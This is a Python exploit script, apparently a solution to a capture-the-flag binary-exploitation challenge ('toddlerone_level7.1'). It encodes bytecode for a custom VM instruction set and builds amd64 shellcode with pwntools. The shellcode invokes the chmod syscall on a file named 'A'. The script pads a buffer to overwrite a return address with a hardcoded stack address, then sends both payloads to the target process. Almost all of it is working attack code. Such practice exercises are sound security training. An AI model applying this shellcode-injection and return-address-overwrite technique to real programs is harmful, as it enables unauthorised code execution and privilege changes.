# import idc
# addr = 0x5020
# size = 0x243
# bytes_data = idc.get_bytes(addr, size)

'''
op   : op[3]
arg1 : op[1]
arg2 : op[2]
'''

def getarg(arg):
    if arg[0:2] == "0x":
        return int(arg, 16).to_bytes(1, "little")
    if arg[0] == "*":
        arg=arg[1:]
    ireg = 1
    reg="fdsiacb"
    if reg.find(arg) != -1:
        ireg = ireg << reg.find(arg)
        return ireg.to_bytes(1, "little")
    elif arg == "open":
        return b"\x01"
    elif arg == "read_memory":
        return b"\x08"
    elif arg == "write":
        return b"\x10"
    return None
def assembly(ass):
    if ass == "":
        return b""
    bc = bytearray()
    ass = ass.split(" ")
    if(ass[0] == "IMM"):
        op = b"\x40"
    elif(ass[0] == "ADD"):
        op = b"\x10"
    elif(ass[0] == "STK"):
        op = b"\x02"
    elif(ass[0] == "STM"):
        op = b"\x80"
    elif(ass[0] == "LDM"):
        op = b"\x08"
    elif(ass[0] == "CMP"):
        op = b"\x04"
    elif(ass[0] == "JMP"):
        op = b"\x20"
    elif(ass[0] == "SYS"):
        op = b"\x01"
    
    for i in ass:
        c = getarg(i)
        if c != None:
            bc += c

    bc.insert(2,op[0])
    return bc
c = bytearray()

asm = '''IMM a = 0x00
IMM b = 0xe0
IMM c = 0xff
SYS read_memory d'''
asm = asm.split("\n")
for i in asm:
    c+=assembly(i)

print(c)

from pwn import *
context.arch = "amd64"

my_sc = asm('''
            push 0x41
            mov rdi, rsp
            mov sil, 0x4
            mov al, 0x5a
            syscall
'''
)
# display the bytes
print(disasm(my_sc))
p = process("/challenge/toddlerone_level7.1")
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/toddlerone_level7.1", gdbscript='continue')

p.send(c)

c = my_sc + b"\xff" *(0x38 - len(my_sc)) + 0x00007fffffffe280.to_bytes(8, "little")
p.send(c)

all = p.recvall(timeout = 1)
print(all.decode(errors="ignore"))
p.close()